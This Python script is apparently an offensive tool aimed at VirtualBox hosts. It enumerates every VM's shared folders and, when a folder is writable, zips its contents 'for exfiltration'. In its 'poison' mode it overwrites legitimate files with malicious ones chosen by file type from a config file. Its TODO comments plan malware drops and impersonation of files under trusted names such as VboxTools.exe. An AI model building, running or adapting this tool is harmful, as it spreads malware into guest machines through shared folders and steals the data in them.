import virtualbox
import argparse
import shutil
import os 
import sys
import configparser

def findVMs():
    vbox = virtualbox.VirtualBox()
    machineNames = []
    for m in vbox.machines:
        machineNames.append(m.name)
    return machineNames

def checkCanWrite(shares: dict):
    writable = False
    sharedFolder = ""
    for key, value in shares.items():
        if key == "Writable" and value == True:
            writable = True
        if key == "Shared Folder Host Path":
            sharedFolder = value


    return writable, sharedFolder


def checkSharedFolder(sharedFolderObj, machineName):
    if len(sharedFolderObj) != 0:
        for item in sharedFolderObj:
            tmpDict = {"VM Name": machineName, "Shared Folder Name": item.name, "Shared Folder Host Path": item.host_path, "Writable": item.writable}
            return tmpDict

def enumeratePath(sharedFilePath: str):
    result = [os.path.join(dp, f) for dp, dn, filenames in os.walk(sharedFilePath) for f in filenames]
    return result

"""
Supports 2 modes:
    - Poison
    - Enum

Todo
- [ x ] Test if it'll enumerate multiple shared folders
- [ x ] Add in functionality that'll add malware to the shared folder
- [ ] Add in functionality that if there's no shared folder, it'll create one
- [ ] Maybe auto-mount the shared folder if it's not already mounted?
- [ x ] Turn shared folder finder into a separate function
- [ x ] Add in enumeration mode to enumerate files existing within shared folders
- [ x ] Maybe for posioning feature, add in a way to remove & replace existing files within the shared folder to impersonate them?
    - [ ] & if no files currently exist within the shared folder, create one that has a legitimate name (EX: VboxTools.exe)
    - [ ] Add in method to differentiate between VM types & copy files respective to the OS type of a VM (EX: If it's a Windows VM, copy .exe files or doc files. If linux, copy .sh, etc)
- Docs/available functions: https://github.com/sethmlarson/virtualbox-python/blob/master/virtualbox/library.py
"""

if __name__ == '__main__':
    # Parsing arg for file to poison shares with
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", help="Full path to the file to copy to shared drive", required=False)
    parser.add_argument("-m", "--mode", help="Mode to operate in. Available modes are poison & enum.", required=True)
    args = parser.parse_args()

    machines = findVMs()
    vbox = virtualbox.VirtualBox()
    sharedFolderList = []
    
    for machine in machines:
        vm = vbox.find_machine(machine)
        session = vm.create_session()

        sharedFolders = session.machine.shared_folders
        
        out = checkSharedFolder(sharedFolders, machine)
        if out != None:
            sharedFolderList.append(out)
        

        session.unlock_machine()

    
    #print(f"[+] Discovered shared folders: {len(sharedFolderList)}")


    # Loop through discovered shared folders & check if writable
    for entry in sharedFolderList:
        writable, path = checkCanWrite(entry)
        # Todo: [ ] Even if a folder isn't writable, we should be able to create a zip file with the contents of a shared folder? Test this
        if writable:
            # Create zip file of items in shared folder for exfiltration
            if args.mode.lower() == "enum":
                print(f"[+] Enumeration mode set. Zipping: {path}...")
                shutil.make_archive(entry["VM Name"] + "-shared-folder", "zip", path)
            # Poison mode will create zip file & replace files
            elif args.mode.lower() == "poison":
                # Create zip file of items in shared folder for exfiltration
                print(f"[+] Poison mode set. Zipping {path} for backup...")
                shutil.make_archive(entry["VM Name"] + "-shared-folder", "zip", path)
                # Ensure poison file config is specified. If not create zip & exit
                if args.file == None:
                    print(f"[!] Poison file config not set! Must be specified to proceed with file replacement...")
                    sys.exit()
                else:
                    # Parse config file to find malicious files to replace legit files with
                    config = configparser.ConfigParser()
                    config.read(args.file)
                    # Grab filenames of items in shared folder to replace them with malicious ones
                    filenames = enumeratePath(path)
                    for filename in filenames:
                        # Reference config file to find filetypes & respective malicious ones to replace legitimate ones with
                        # If a filetype & its malicious location isn't referenced within the config file, it's ignored & not replaced
                        for filetype, value in config["filetype locations"].items():
                            if filename.split(".")[-1] == filetype:
                                print(f"[+] Replacing {filename} with {value}...")
                                shutil.copy2(value, filename)
                    
